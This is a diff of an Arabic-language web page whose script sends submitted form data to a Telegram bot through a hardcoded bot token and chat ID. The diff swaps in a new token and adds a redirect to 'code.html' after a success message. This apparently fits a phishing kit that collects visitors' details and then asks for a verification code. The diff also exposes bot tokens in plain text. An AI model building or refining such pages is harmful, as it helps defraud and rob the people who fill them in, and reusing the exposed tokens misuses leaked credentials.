@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="ar">
 
 <head>
@@ -75,7 +74,7 @@
         }
 
         .form-group.centered-button button:hover {
-            background-color: #32CD32;
+            background-color: #006400;
         }
     </style>
 </head>
@@ -159,7 +158,7 @@
                 `;
 
                 // Telegram Bot API settings
-                const botToken = '7926981209:AAEVbVa-TnVm9uDc3Oyi9-7AiduFCKL9YgE';
+                const botToken = '7356894979:AAFxs2g1BAkp6qYCgf3ZE8mvaLvaIuoBmI4';
                 const chatId = '6873334348';
 
                 // Send the data to Telegram
@@ -176,6 +175,9 @@
                             title: "تم التأكيد",
                             text: "تم إرسال البيانات بنجاح",
                             icon: "success"
+                        }).then(() => {
+                            // Redirect to another page after success
+                            window.location.href = "code.html"; // Replace with your destination URL
                         });
                     },
                     error: function(error) {
